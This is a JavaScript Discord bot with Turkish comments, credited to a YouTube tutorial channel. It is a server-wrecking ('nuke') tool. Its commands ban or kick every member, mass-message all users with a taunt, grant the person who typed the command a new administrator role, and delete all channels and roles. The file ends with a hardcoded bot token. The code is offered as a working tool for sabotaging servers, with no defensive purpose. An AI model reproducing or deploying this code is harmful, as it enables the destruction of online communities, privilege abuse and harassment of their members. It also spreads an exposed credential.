const Discord = require("discord.js"); //TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryt KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(process.env.token);

client.on("message", msg => {           ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "bana tilt olmussunuz vallahi üzüldüm ne diim"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+yön") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === ".mdr") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
    await msg.guild.roles.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

          await msg.guild.createChannel("tiltolmuslaryazik", {
      type: "text"
    });
        
  }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
});

 //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR



client.login("OTA0NDAyNDc4Nzk0MTQ1OTYy.YX7AcQ.ir2W3HWXqIDHAJidR8wFK1DDnzU")